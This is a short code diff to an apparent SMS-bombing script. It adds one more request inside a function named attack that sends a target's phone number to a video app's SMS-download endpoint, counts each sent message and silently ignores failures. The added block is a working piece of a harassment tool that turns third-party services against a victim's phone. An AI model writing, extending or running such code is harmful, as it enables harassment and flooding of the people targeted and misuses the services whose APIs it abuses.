@@ -230,4 +230,12 @@ def attack(number, sms):
             check(sent, sms)
         except:
             pass
+        
+        try:
+            requests.post('https://api.like-video.com/likee-activity-flow-micro/commonApi/sendDownloadSms', json={"telephone": number_7, "lang": "ru"}, headers=HEADERS)
+            sent += 1
+            time(sent)
+            check(sent, sms)
+        except:
+            pass
 
